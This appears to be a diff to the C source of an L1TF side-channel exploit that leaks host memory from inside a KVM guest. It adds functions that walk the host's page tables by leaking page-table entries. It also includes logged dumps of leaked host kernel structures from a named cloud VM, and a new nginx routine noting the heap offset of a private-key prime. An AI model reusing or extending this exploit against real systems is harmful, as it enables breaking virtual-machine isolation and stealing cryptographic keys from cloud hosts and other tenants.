@@ -16,6 +16,7 @@
 #include "util.h"
 #include "timing.h"
 #include "reverse.h"
+#include "benchmark.h"
 
 #define STR(a) STRSTR(a)
 #define STRSTR(a) #a
@@ -32,16 +33,16 @@ uintptr_t get_feeling_translate_va(uintptr_t l0, uintptr_t va)
 	printf("get_feeling_translate_va(l0 = %lx, va = %lx)\n", l0, va);
 	l0 -= hc_direct_map();
 	dump(l0);
-	uintptr_t pgd_ptr = l0 + 8 * BITS(va, 48, 39);
-	dump(pgd_ptr);
-	uintptr_t pgd = hc_read_pa(pgd_ptr);
+	uintptr_t pgd_pa = l0 + 8 * BITS(va, 48, 39);
+	dump(pgd_pa);
+	uintptr_t pgd = hc_read_pa(pgd_pa);
 	dump(pgd);
 
 	uintptr_t l1 = pgd & PFN_MASK;
 	dump(l1);
-	uintptr_t pud_ptr = l1 + 8 * BITS(va, 39, 30);
-	dump(pud_ptr);
-	uintptr_t pud = hc_read_pa(pud_ptr);
+	uintptr_t pud_pa = l1 + 8 * BITS(va, 39, 30);
+	dump(pud_pa);
+	uintptr_t pud = hc_read_pa(pud_pa);
 	dump(pud);
 	if (IS_HUGE(pud)) {
 		uintptr_t pa = (pud & BITS_MASK(52, 30)) | BITS(va, 30, 0);
@@ -52,9 +53,9 @@ uintptr_t get_feeling_translate_va(uintptr_t l0, uintptr_t va)
 
 	uintptr_t l2 = pud & PFN_MASK;
 	dump(l2);
-	uintptr_t pmd_ptr = l2 + 8 * BITS(va, 30, 21);
-	dump(pmd_ptr);
-	uintptr_t pmd = hc_read_pa(pmd_ptr);
+	uintptr_t pmd_pa = l2 + 8 * BITS(va, 30, 21);
+	dump(pmd_pa);
+	uintptr_t pmd = hc_read_pa(pmd_pa);
 	dump(pmd);
 	if (IS_HUGE(pmd)) {
 		uintptr_t pa = (pmd & BITS_MASK(52, 21)) | BITS(va, 21, 0);
@@ -65,13 +66,71 @@ uintptr_t get_feeling_translate_va(uintptr_t l0, uintptr_t va)
 
 	uintptr_t l3 = pmd & PFN_MASK;
 	dump(l3);
-	uintptr_t pte_ptr = l3 + 8 * BITS(va, 21, 12);
-	dump(pte_ptr);
-	uintptr_t pte = hc_read_pa(pte_ptr);
+	uintptr_t pte_pa = l3 + 8 * BITS(va, 21, 12);
+	dump(pte_pa);
+	uintptr_t pte = hc_read_pa(pte_pa);
 	dump(pte);
 	uintptr_t pa = (pte & PFN_MASK) | BITS(va, 12, 0);
 	dump(pa);
 	printf("true pa from hc_translate_va: %lx\n\n", hc_translate_va(va));
+	return pa;
+}
+
+uintptr_t leak_pte(uintptr_t base, uintptr_t pa)
+{
+	uintptr_t val;
+	do {
+		for (int i = 0; i < 5; i++)
+			l1tf_leak((char *)&val, base, pa, sizeof(uintptr_t));
+		printf("leak_pte: %lx\n", val);
+	} while (!((val & 0x7ff8000000000ffbULL) == 0x63));
+	return val;
+}
+
+uintptr_t leak_translation(uintptr_t base, uintptr_t l0_pa, uintptr_t va)
+{
+	// `l0_pa` is the physical address of the root page table.
+	printf("leak_translation(l0_pa = %lx, va = %lx)\n", l0_pa, va);
+	assert(l0_pa < HOST_MEMORY_SIZE);
+	dump(l0_pa);
+
+	uintptr_t pgd_pa = l0_pa + 8 * BITS(va, 48, 39);
+	dump(pgd_pa);
+	uintptr_t pgd = leak_pte(base, pgd_pa);
+	dump(pgd);
+
+	uintptr_t l1_pa = pgd & PFN_MASK;
+	dump(l1_pa);
+	uintptr_t pud_pa = l1_pa + 8 * BITS(va, 39, 30);
+	dump(pud_pa);
+	uintptr_t pud = leak_pte(base, pud_pa);
+	dump(pud);
+	if (IS_HUGE(pud)) {
+		uintptr_t pa = (pud & BITS_MASK(52, 30)) | BITS(va, 30, 0);
+		dump(pa);
+		return pa;
+	}
+
+	uintptr_t l2_pa = pud & PFN_MASK;
+	dump(l2_pa);
+	uintptr_t pmd_pa = l2_pa + 8 * BITS(va, 30, 21);
+	dump(pmd_pa);
+	uintptr_t pmd = leak_pte(base, pmd_pa);
+	dump(pmd);
+	if (IS_HUGE(pmd)) {
+		uintptr_t pa = (pmd & BITS_MASK(52, 21)) | BITS(va, 21, 0);
+		dump(pa);
+		return pa;
+	}
+
+	uintptr_t l3_pa = pmd & PFN_MASK;
+	dump(l3_pa);
+	uintptr_t pte_pa = l3_pa + 8 * BITS(va, 21, 12);
+	dump(pte_pa);
+	uintptr_t pte = leak_pte(base, pte_pa);
+	dump(pte);
+	uintptr_t pa = (pte & PFN_MASK) | BITS(va, 12, 0);
+	dump(pa);
 	return pa;
 }
 
@@ -151,7 +210,7 @@ void get_feeling_for_kernel_kvm_data_structures(void)
 		char comm[16];
 		*(uint64_t *)comm = hc_read_va(task_struct + 0xbf0);
 		*(uint64_t *)&comm[8] = hc_read_va(task_struct + 0xbf0 + 8);
-		// printf("task_struct: %16lx tgid: %3d, pid: %3d comm: %s\n", task_struct, tgid, pidd, comm);
+		if (0) printf("task_struct: %16lx tgid: %3d, pid: %3d comm: %s\n", task_struct, tgid, pidd, comm);
 
 		nr_processes++;
 		task_struct = hc_read_va(task_struct + 0x900) - 0x900; // task_struct's tasks.next
@@ -203,9 +262,9 @@ void reverse_host_kernel_data_structures(void)
 {
         // Results below were gathered on rain-vm-gce.
 
-	// uintptr_t base = 0x88d43f218;
+	uintptr_t base = 0x88d43f218;
 	
-	// uintptr_t direct_map = 0xffff934040000000;
+	uintptr_t direct_map = 0xffff934040000000;
 
 	// uintptr_t kvm_lapic = 0xffff9348e6de5e00;
 
@@ -322,7 +381,7 @@ void reverse_host_kernel_data_structures(void)
 	// 	// uintptr_t task_struct = *(uintptr_t *)&data[0x10] - 0xa40; // *(pid+0x10)
 	// 	uintptr_t task_struct = (0xffff936a91dbaa78 - 0xa40) & ~63; // *(pid+0x10)
 	// 	printf("task_struct+0x8c0:\n");
-	// 	for (int off = 0x8c0; off < 0x940; off += 0x40) {
+	// 	for (int off = 0x8c0; off < 0x980; off += 0x40) {
 	// 		char *data = thijs_l1tf_leak(base, task_struct-direct_map+off, 0x40);
 	// 		display_data(data);
 	// 	}
@@ -348,8 +407,94 @@ void reverse_host_kernel_data_structures(void)
 	// printf("comm = %s\n", comm);
 
 
+	// char task_struct[0x80];
+	// for (int i = 0; i < 11; i++) {
+	// 	printf("task_struct+0x900:\n");
+	// 	l1tf_leak(task_struct, base, 0xffff936a91dba000-direct_map+0x900, sizeof(task_struct));
+	// 	display(task_struct, sizeof(task_struct));
+	// }
+	// task_struct+0x900:
+	//    0:  ffffffff8501a440   40 a4 01 85 ff ff ff ff @.......
+	//    8:  ffff93416c014a80   80 4a 01 6c 41 93 ff ff .J.lA...
+	//   10:                8c   8c 00 00 00 00 00 00 00 ........
+	//   18:  ffff936a91dba918   18 a9 db 91 6a 93 ff ff ....j...
+	//   20:  ffff936a91dba918   18 a9 db 91 6a 93 ff ff ....j...
+	//   28:  ffff936a91dba928   28 a9 db 91 6a 93 ff ff (...j...
+	//   30:  ffff936a91dba928   28 a9 db 91 6a 93 ff ff (...j...
+	//   38:  ffff936a91dba938   38 a9 db 91 6a 93 ff ff 8...j...
+	//   40:                 0   00 00 00 00 00 00 00 00 ........
+	//   48:                 0   00 00 00 00 00 00 00 00 ........
+	//   50:  ffff9342868f2000   00 20 8f 86 42 93 ff ff . ..B... <-- struct mm_struct *mm
+	//   58:  ffff9342868f2000   00 20 8f 86 42 93 ff ff . ..B... <-- struct mm_struct *active_mm
+	//   60:                 0   00 00 00 00 00 00 00 00 ........
+	//   68:             f376a   6a 37 0f 00 00 00 00 00 j7......
+	//   70:  ffff93428823e988   88 e9 23 88 42 93 ff ff ..#.B...
+	//   78:                 0   00 00 00 00 00 00 00 00 ........
+
+	// uintptr_t mm = 0xffff9342868f2000; // task_struct+0x950
+	// char mm_struct[0x70];
+	// for (int i = 0; i < 11; i++) {
+	// 	printf("mm_struct+0x40:\n");
+	// 	l1tf_leak(mm_struct, base, mm-direct_map+0x40, sizeof(mm_struct));
+	// 	display(mm_struct, sizeof(mm_struct));
+	// }
+	// mm_struct+0x40:
+	//    0:                 1   01 00 00 00 00 00 00 00 ........
+	//    8:                 0   00 00 00 00 00 00 00 00 ........
+	//   10:          ffffe000   00 e0 ff ff 00 00 00 00 ........
+	//   18:          555a1000   00 10 5a 55 00 00 00 00 ..ZU....
+	//   20:          f7fb2000   00 20 fb f7 00 00 00 00 . ......
+	//   28:                 1   01 00 00 00 00 00 00 00 ........
+	//   30:      7ffffffff000   00 f0 ff ff ff 7f 00 00 ........
+	//   38:      7ffda0b1c000   00 c0 b1 a0 fd 7f 00 00 ........
+	//   40:  ffff934151cf6000   00 60 cf 51 41 93 ff ff .`.QA...
+	//   48:                c2   c2 00 00 00 00 00 00 00 ........
+	//   50:                 0   00 00 00 00 00 00 00 00 ........
+	//   58:                 0   00 00 00 00 00 00 00 00 ........
+	//   60:                 0   00 00 00 00 00 00 00 00 ........
+	//   68:                 0   00 00 00 00 00 00 00 00 ........
 
 
+	// uintptr_t pgd = 0xffff934151cf6000; // mm_struct+0x80
+	// char pgd_data[0x40];
+	// for (int i = 0; i < 11; i++) {
+	// 	printf("pgd+0xfc0:\n");
+	// 	l1tf_leak(pgd_data, base, pgd-direct_map+0xfc0, sizeof(pgd_data));
+	// 	display(pgd_data, sizeof(pgd_data));
+	// }
+	// pgd+0xfc0:
+	//    0:                 0   00 00 00 00 00 00 00 00 ........
+	//    8:                 0   00 00 00 00 00 00 00 00 ........
+	//   10:                 0   00 00 00 00 00 00 00 00 ........
+	//   18:                 0   00 00 00 00 00 00 00 00 ........
+	//   20:        c03ffd0067   67 00 fd 3f c0 00 00 00 g..?....
+	//   28:                 0   00 00 00 00 00 00 00 00 ........
+	//   38:        c034a13067   67 30 a1 34 c0 00 00 00 g0.4....
+
+	// uintptr_t kvm = 0xffff9584f2d71000;
+	// uintptr_t kvm_pa = leak_translation(base, pgd-direct_map, kvm);
+	// leak_translation(l0_pa = 111cf6000, va = ffff9584f2d71000)
+	//                l0_pa =        111cf6000
+	//               pgd_pa =        111cf6958
+	// leak_pte: 100000067
+	//                  pgd =        100000067
+	//                l1_pa =        100000000
+	//               pud_pa =        100000098
+	// leak_pte: 100263067
+	//                  pud =        100263067
+	//                l2_pa =        100263000
+	//               pmd_pa =        100263cb0
+	// leak_pte: 6057fbd067
+	//                  pmd =       6057fbd067
+	//                l3_pa =       6057fbd000
+	//               pte_pa =       6057fbdb88
+	// leak_pte: 800000013354d063
+	//                  pte = 800000013354d063
+	//                   pa =        13354d000
+	uintptr_t kvm_pa = 0x13354d000;
+
+
+// =============================================================================
 
 
 	// #define N 64
@@ -401,4 +546,9 @@ void reverse_host_kernel_data_structures(void)
 
 
 	// Leaked 0xc0 bytes at direct map adddress 0xffff9348e6de5e00, i.e. pa (0xffff9348e6de5e00-0xffff934040000000)
+}
+
+void reverse_nginx(void)
+{
+	// At offset 0x008b9a2 from the start of the heap of nginx lies the first prime of the private key. (nginx master process)
 }
